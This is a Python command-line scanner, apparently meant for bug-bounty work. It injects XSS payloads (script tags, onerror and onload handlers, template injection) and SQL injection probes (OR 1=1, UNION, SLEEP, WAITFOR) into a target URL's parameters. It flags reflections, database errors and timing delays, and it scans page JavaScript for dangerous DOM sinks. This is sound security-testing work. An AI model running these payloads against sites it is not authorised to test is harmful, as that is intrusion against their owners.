import argparse
import requests
import urllib3
import json
import time
import os
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from datetime import datetime

urllib3.disable_warnings()

HEADERS = {"User-Agent": "Mozilla/5.0 (BugBounty-Scanner/1.0)"}

# ─── Helpers ──────────────────────────────────────────────────────────────────

def replace_param_value(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

def get_params(url: str) -> list[str]:
    return list(parse_qs(urlparse(url).query).keys())

def req_get(url, token=None):
    h = {**HEADERS}
    if token: h["Authorization"] = f"Bearer {token}"
    try:
        return requests.get(url, headers=h, timeout=10, verify=False, allow_redirects=True)
    except:
        return None

def req_post(url, data: dict, token=None):
    h = {**HEADERS, "Content-Type": "application/x-www-form-urlencoded"}
    if token: h["Authorization"] = f"Bearer {token}"
    try:
        return requests.post(url, data=data, headers=h, timeout=10, verify=False, allow_redirects=True)
    except:
        return None

# ─── XSS Detection ────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    # Basic reflection
    ('<script>alert("XSS")</script>',          "script tag reflection"),
    ('"<script>alert(1)</script>',             "quote-break + script"),
    ("'><script>alert(1)</script>",            "attribute break + script"),
    ("<img src=x onerror=alert(1)>",           "img onerror"),
    ("<svg onload=alert(1)>",                  "svg onload"),
    ("javascript:alert(1)",                     "javascript: proto"),
    ("<iframe src=javascript:alert(1)>",        "iframe js src"),
    ('"><img src=1 onerror=alert(document.domain)>', "domain disclosure"),
    ("%3Cscript%3Ealert(1)%3C/script%3E",      "URL-encoded script"),
    ("</script><script>alert(1)</script>",      "script break"),
    ("<body onload=alert(1)>",                  "body onload"),
    ("{{constructor.constructor('alert(1)')()}}","Angular template injection"),
]

DOM_SINKS = [
    "document.write(", "document.writeln(", "innerHTML", "outerHTML",
    "insertAdjacentHTML", "eval(", "setTimeout(", "setInterval(",
    "location.href", "window.location", "document.location",
]

def scan_dom_xss(url: str) -> list[dict]:
    """Check JS source for dangerous DOM sinks that could lead to DOM-XSS."""
    findings = []
    r = req_get(url)
    if not r:
        return findings

    # Check inline scripts
    body = r.text
    for sink in DOM_SINKS:
        if sink in body:
            # Look for user-controlled input being passed to sink
            idx = body.find(sink)
            context = body[max(0, idx-100):idx+100]
            if any(kw in context.lower() for kw in ["location", "search", "hash", "param", "url", "query", "get", "input"]):
                findings.append({
                    "type": "Potential DOM XSS",
                    "severity": "MEDIUM",
                    "url": url,
                    "sink": sink,
                    "context": context.strip(),
                    "detail": f"Dangerous sink '{sink}' found near user-controlled input context",
                })
                print(f"  [!] DOM XSS sink '{sink}' found near user input")

    # Check linked JS files
    import re
    js_files = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', body)
    parsed = urlparse(url)
    for js in js_files[:10]:
        if js.startswith("http"):
            js_url = js
        elif js.startswith("/"):
            js_url = f"{parsed.scheme}://{parsed.netloc}{js}"
        else:
            js_url = f"{parsed.scheme}://{parsed.netloc}/{js}"
        try:
            jr = requests.get(js_url, headers=HEADERS, timeout=8, verify=False)
            for sink in DOM_SINKS:
                if sink in jr.text:
                    idx = jr.text.find(sink)
                    ctx = jr.text[max(0, idx-80):idx+80]
                    findings.append({
                        "type": "DOM XSS Sink in JS File",
                        "severity": "LOW",
                        "js_file": js_url,
                        "sink": sink,
                        "context": ctx.strip(),
                    })
        except:
            pass

    return findings


def scan_reflected_xss(url: str, post_data: str = None, token: str = None) -> list[dict]:
    """Inject XSS payloads and check if they are reflected in the response."""
    findings = []
    params = get_params(url) if not post_data else list(dict(p.split("=") for p in post_data.split("&") if "=" in p).keys())

    print(f"\n[*] Reflected XSS — testing {len(params)} params with {len(XSS_PAYLOADS)} payloads each")

    for param in params:
        for payload, desc in XSS_PAYLOADS:
            if not post_data:
                test_url = replace_param_value(url, param, payload)
                r = req_get(test_url, token)
            else:
                data_dict = dict(p.split("=", 1) for p in post_data.split("&") if "=" in p)
                data_dict[param] = payload
                r = req_post(url, data_dict, token)
                test_url = url

            if not r:
                continue

            # Check reflection
            reflected = payload in r.text or payload.lower() in r.text.lower()
            # Check if not encoded
            encoded = ("&lt;" in r.text and "<" in payload) or ("&gt;" in r.text and ">" in payload)

            if reflected and not encoded:
                findings.append({
                    "type": "Reflected XSS",
                    "severity": "HIGH",
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "description": desc,
                    "detail": "Payload reflected unencoded in response — manual verification required",
                })
                print(f"  [!] Reflected XSS — param={param} | payload: {payload[:50]}")
            elif reflected and encoded:
                print(f"  [~] Reflected but encoded (param={param}) — likely safe")

    return findings

# ─── SQLi Detection ───────────────────────────────────────────────────────────

# Error-based
SQLI_ERROR_PAYLOADS = [
    "'"        , "''",
    "' OR 1=1--", "' OR '1'='1",
    "1'",
    '" OR "1"="1',
    "1 AND 1=2",
    "' AND SLEEP(0)--",
    ") OR 1=1--",
    "' UNION SELECT NULL--",
    "admin'--",
    "1; SELECT 1--",
    "' OR 1=1 LIMIT 1--",
]

DB_ERROR_PATTERNS = [
    "you have an error in your sql",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg::syntaxerror",
    "syntax error at or near",
    "ora-",
    "sqlite_error",
    "microsoft odbc",
    "jdbc",
    "[microsoft][odbc",
    "supplied argument is not a valid mysql",
    "unexpected end of sql command",
    "column count doesn't match",
]

def scan_error_sqli(url: str, post_data: str = None, token: str = None) -> list[dict]:
    """Test for error-based SQL injection."""
    findings = []
    params = get_params(url) if not post_data else list(dict(p.split("=",1) for p in post_data.split("&") if "=" in p).keys())

    print(f"\n[*] Error-based SQLi — {len(params)} params")

    for param in params:
        for payload in SQLI_ERROR_PAYLOADS:
            if not post_data:
                test_url = replace_param_value(url, param, payload)
                r = req_get(test_url, token)
            else:
                data_dict = dict(p.split("=", 1) for p in post_data.split("&") if "=" in p)
                data_dict[param] = payload
                r = req_post(url, data_dict, token)
                test_url = url

            if not r:
                continue

            body_lower = r.text.lower()
            triggered = [pat for pat in DB_ERROR_PATTERNS if pat in body_lower]

            if triggered:
                findings.append({
                    "type": "Error-Based SQL Injection",
                    "severity": "CRITICAL",
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "indicators": triggered,
                    "detail": f"DB error pattern detected: {triggered}",
                })
                print(f"  [CRITICAL] SQLi error-based — param={param} | payload={payload} | {triggered}")
                break  # One finding per param is enough

    return findings


def scan_boolean_sqli(url: str, token: str = None) -> list[dict]:
    """
    Detect boolean-based blind SQLi:
    True condition → same response as baseline
    False condition → different response
    """
    findings = []
    params = get_params(url)
    print(f"\n[*] Boolean-based Blind SQLi — {len(params)} params")

    for param in params:
        baseline = req_get(url, token)
        if not baseline:
            continue

        true_url  = replace_param_value(url, param, "1 AND 1=1")
        false_url = replace_param_value(url, param, "1 AND 1=2")

        r_true  = req_get(true_url,  token)
        r_false = req_get(false_url, token)

        if not r_true or not r_false:
            continue

        baseline_size = len(baseline.text)
        true_size     = len(r_true.text)
        false_size    = len(r_false.text)

        # True should be similar to baseline; false should differ
        true_similar  = abs(true_size  - baseline_size) < 50
        false_differs = abs(false_size - baseline_size) > 100

        if true_similar and false_differs:
            findings.append({
                "type": "Boolean-Based Blind SQLi",
                "severity": "CRITICAL",
                "param": param,
                "url": url,
                "baseline_size": baseline_size,
                "true_size": true_size,
                "false_size": false_size,
                "detail": f"TRUE condition ~ baseline ({baseline_size}), FALSE condition differs ({false_size})",
            })
            print(f"  [CRITICAL] Boolean SQLi — param={param} | baseline={baseline_size} true={true_size} false={false_size}")

    return findings


def scan_time_sqli(url: str, token: str = None, threshold: float = 4.0) -> list[dict]:
    """Detect time-based blind SQLi using SLEEP/WAITFOR/pg_sleep payloads."""
    findings = []
    params = get_params(url)
    print(f"\n[*] Time-based Blind SQLi — {len(params)} params (threshold: {threshold}s)")

    TIME_PAYLOADS = [
        "'; WAITFOR DELAY '0:0:5'--",   # MSSQL
        "'; SELECT SLEEP(5)--",          # MySQL
        "' OR SLEEP(5)--",              # MySQL alternate
        "1; SELECT pg_sleep(5)--",       # PostgreSQL
        "' AND 1=IF(1=1,SLEEP(5),0)--", # MySQL conditional
        "1' AND SLEEP(5) AND '1'='1",
    ]

    for param in params:
        for payload in TIME_PAYLOADS:
            test_url = replace_param_value(url, param, payload)
            start = time.time()
            r = req_get(test_url, token)
            elapsed = time.time() - start

            if elapsed >= threshold:
                findings.append({
                    "type": "Time-Based Blind SQLi",
                    "severity": "CRITICAL",
                    "param": param,
                    "payload": payload,
                    "url": test_url,
                    "elapsed_seconds": round(elapsed, 2),
                    "detail": f"Response delayed {round(elapsed,2)}s — SLEEP/WAITFOR likely executed",
                })
                print(f"  [CRITICAL] Time SQLi — param={param} delayed {round(elapsed,2)}s | {payload}")
                break  # One hit per param

    return findings

# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="XSS & SQLi Scanner")
    parser.add_argument("-u", "--url",    required=True,  help="Target URL")
    parser.add_argument("-t", "--token",                  help="Bearer token")
    parser.add_argument("-d", "--data",                   help="POST data (e.g. 'user=admin&pass=test')")
    parser.add_argument("-o", "--output", default="output", help="Output dir")
    parser.add_argument("--xss",  action="store_true", help="Run XSS tests")
    parser.add_argument("--sqli", action="store_true", help="Run SQLi tests")
    parser.add_argument("--all",  action="store_true", help="Run all tests")
    args = parser.parse_args()

    run_all = args.all or (not args.xss and not args.sqli)
    all_findings = []

    print(f"\nTarget: {args.url}")
    print(f"Mode:   {'POST' if args.data else 'GET'}\n")

    if run_all or args.xss:
        print("[XSS] DOM XSS Sink Analysis")
        all_findings += scan_dom_xss(args.url)

        print("[XSS] Reflected XSS")
        all_findings += scan_reflected_xss(args.url, args.data, args.token)

    if run_all or args.sqli:
        all_findings += scan_error_sqli(args.url, args.data, args.token)
        if not args.data:
            all_findings += scan_boolean_sqli(args.url, args.token)
            all_findings += scan_time_sqli(args.url, args.token)

    # Save
    os.makedirs(args.output, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_path = os.path.join(args.output, f"injection_scan_{ts}.json")
    with open(out_path, "w") as f:
        json.dump({
            "target": args.url,
            "timestamp": datetime.now().isoformat(),
            "total_findings": len(all_findings),
            "findings": all_findings,
        }, f, indent=2)

    print(f"\n{'='*50}")
    print(f"  Total findings: {len(all_findings)}")
    critical = sum(1 for f in all_findings if f.get("severity") == "CRITICAL")
    high     = sum(1 for f in all_findings if f.get("severity") == "HIGH")
    print(f"  CRITICAL: {critical}  HIGH: {high}")
    print(f"  Report: {out_path}")
    print(f"{'='*50}")

if __name__ == "__main__":
    main()
